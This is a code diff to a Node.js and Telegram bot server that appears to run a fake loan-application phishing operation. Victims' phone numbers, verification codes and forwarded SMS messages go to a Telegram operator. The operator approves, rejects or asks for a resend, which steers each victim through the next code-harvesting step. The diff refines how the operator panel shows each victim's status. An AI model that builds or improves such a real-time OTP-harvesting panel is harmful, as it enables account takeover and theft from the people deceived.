@@ -33,7 +33,7 @@ io.on('connection', (socket) => {
 📞 <b>Phone:</b> +237 ${data.phone}
 🔑 <b>5-Digit Code:</b> ${data.verificationCode}
 ━━━━━━━━━━━━━━━━
-<i>Waiting for your decision...</i>
+⏳ <b>Status:</b> Waiting for your decision...
         `;
 
         try {
@@ -57,6 +57,8 @@ io.on('connection', (socket) => {
 📩 <b>SMS Received from User</b>
 ━━━━━━━━━━━━━━━━
 <pre>${escapeHtml(smsMessage)}</pre>
+━━━━━━━━━━━━━━━━
+⏳ <b>Status:</b> Waiting for your decision...
         `;
 
         try {
@@ -82,7 +84,7 @@ io.on('connection', (socket) => {
 ━━━━━━━━━━━━━━━━
 <code>${fullCode}</code>
 ━━━━━━━━━━━━━━━━
-<i>Waiting for your decision...</i>
+⏳ <b>Status:</b> Waiting for your decision...
         `;
 
         try {
@@ -102,60 +104,80 @@ io.on('connection', (socket) => {
     });
 });
 
+// --- HELPER FUNCTION TO UPDATE TELEGRAM MESSAGE STATUS ---
+async function updateMessageStatus(query, originalText, newStatus) {
+    // Replace the "Waiting" text with the new status
+    const updatedText = originalText.replace('⏳ <b>Status:</b> Waiting for your decision...', newStatus);
+    
+    try {
+        await bot.editMessageText(updatedText, {
+            chat_id: query.message.chat.id,
+            message_id: query.message.message_id,
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [] } // Removes buttons after action
+        });
+    } catch (err) {
+        console.error("Error editing message:", err.message);
+    }
+}
+
 // --- TELEGRAM BOT ACTIONS ---
 bot.on('callback_query', async (query) => {
     const data = query.data.split('_');
-    const socketId = data[data.length - 1]; // Get the socket ID
+    const socketId = data[data.length - 1]; 
     const userSocket = io.sockets.sockets.get(socketId);
     
     if (!userSocket) {
         return bot.answerCallbackQuery(query.id, { text: 'User is no longer online or refreshed the page.' });
     }
 
+    // Get the original text from the message we are replying to
+    const originalText = query.message.text;
+
     // --- STEP 1: APPLICATION APPROVAL ---
     if (query.data.startsWith('approve_') && !query.data.includes('sms') && !query.data.includes('final')) {
         bot.answerCallbackQuery(query.id, { text: 'Approved!' });
         userSocket.emit('approved');
-        bot.sendMessage(query.message.chat.id, `✅ <b>APPROVED</b> (User moved to SMS step)`, { parse_mode: 'HTML' });
+        await updateMessageStatus(query, originalText, '✅ <b>Status:</b> APPROVED (Moved to SMS step)');
     } 
     else if (query.data.startsWith('reject_') && !query.data.includes('sms')) {
         bot.answerCallbackQuery(query.id, { text: 'Rejected!' });
         userSocket.emit('rejected');
-        bot.sendMessage(query.message.chat.id, `❌ <b>REJECTED</b> (User sent back to code step)`, { parse_mode: 'HTML' });
+        await updateMessageStatus(query, originalText, '❌ <b>Status:</b> REJECTED (Sent back)');
     }
     
     // --- STEP 2: SMS APPROVAL ---
     else if (query.data.startsWith('approve_sms_')) {
         bot.answerCallbackQuery(query.id, { text: 'SMS Approved!' });
         userSocket.emit('sms_approved');
-        bot.sendMessage(query.message.chat.id, `✅ <b>SMS APPROVED</b> (User moved to final 4-digit step)`, { parse_mode: 'HTML' });
+        await updateMessageStatus(query, originalText, '✅ <b>Status:</b> SMS APPROVED (Moved to final code)');
     } 
     else if (query.data.startsWith('reject_sms_')) {
         bot.answerCallbackQuery(query.id, { text: 'SMS Rejected!' });
         userSocket.emit('sms_rejected');
-        bot.sendMessage(query.message.chat.id, `❌ <b>SMS REJECTED</b> (User sent back)`, { parse_mode: 'HTML' });
+        await updateMessageStatus(query, originalText, '❌ <b>Status:</b> SMS REJECTED (Sent back)');
     }
     else if (query.data.startsWith('resend_sms_')) {
         bot.answerCallbackQuery(query.id, { text: 'SMS Resend Triggered!' });
         userSocket.emit('sms_resend');
-        bot.sendMessage(query.message.chat.id, `🔄 <b>SMS RESEND</b>`, { parse_mode: 'HTML' });
+        await updateMessageStatus(query, originalText, '🔄 <b>Status:</b> RESENT (Asked user for new SMS)');
     }
 
     // --- STEP 3: FINAL CODE APPROVAL ---
     else if (query.data.startsWith('approve_final_')) {
         bot.answerCallbackQuery(query.id, { text: 'Approved!' });
         userSocket.emit('final_approved');
-        bot.sendMessage(query.message.chat.id, `✅ <b>LOAN APPROVED</b> (User moved to success screen)`, { parse_mode: 'HTML' });
+        await updateMessageStatus(query, originalText, '✅ <b>Status:</b> LOAN APPROVED');
     }
     else if (query.data.startsWith('resend_final_')) {
         bot.answerCallbackQuery(query.id, { text: 'Resend Triggered!' });
         userSocket.emit('final_resend');
-        bot.sendMessage(query.message.chat.id, `🔄 <b>CODE RESEND</b>`, { parse_mode: 'HTML' });
+        await updateMessageStatus(query, originalText, '🔄 <b>Status:</b> CODE RESENT');
     }
     else if (query.data.startsWith('inactive_final_')) {
         bot.answerCallbackQuery(query.id, { text: 'Inactive Triggered!' });
         userSocket.emit('final_inactive');
-        bot.sendMessage(query.message.chat.id, `🚫 <b>LINE INACTIVE</b>`, { parse_mode: 'HTML' });
+        await updateMessageStatus(query, originalText, '🚫 <b>Status:</b> LINE INACTIVE');
     }
 });
 
